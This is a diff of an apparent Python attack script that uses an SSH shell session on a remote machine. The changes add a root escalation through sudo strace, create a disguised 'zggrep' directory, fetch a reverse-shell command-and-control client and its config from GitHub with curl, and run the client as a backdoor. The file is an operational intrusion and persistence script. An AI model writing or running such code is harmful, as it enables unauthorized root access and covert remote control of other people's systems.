@@ -58,6 +58,7 @@ try:
         output += shell.recv(4096).decode("utf-8")
     print(output)
         
+    # perform root escalation
     shell.send(b"sudo /bin/strace -o /dev/null /bin/bash -p\n")
         
     time.sleep(3)
@@ -66,6 +67,7 @@ try:
         output += shell.recv(4096).decode("utf-8")
     print(output)
             
+    # test escalation
     shell.send(b"whoami\n")
     
     time.sleep(1)
@@ -73,22 +75,52 @@ try:
     while shell.recv_ready():
         output += shell.recv(4096).decode("utf-8")     
     print(output)
+    
+    
+    shell.send(b"mkdir zggrep\n")
+            
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
+    
+    
+    shell.send(b"cd zggrep\n")
+            
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
                
-    # stdin, stdout, stderr = client.exec_command("whoami")
-    # print(stdout.read().decode())
-    # print(stderr.read().decode())
+    # get backdoor
+    shell.send(b"curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py\n")
+        
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
     
-    # time.sleep(3)
+    # get config
+    shell.send(b"curl -O https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/config.py\n")
+        
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
     
-    # stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p && whoami")
-    # print(stdout.read().decode())
-    # print(stderr.read().decode())
     
-    # time.sleep(5)
+    shell.send(b"python zggrep.py\n")
+        
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
     
-    # stdin, stdout, stderr = client.exec_command("whoami")
-    # print(stdout.read().decode())
-    # print(stderr.read().decode())
     
     # commands = ["sudo /bin/strace -o /dev/null /bin/bash -p", "cd ../../usr/bin",
     #             "curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py", 
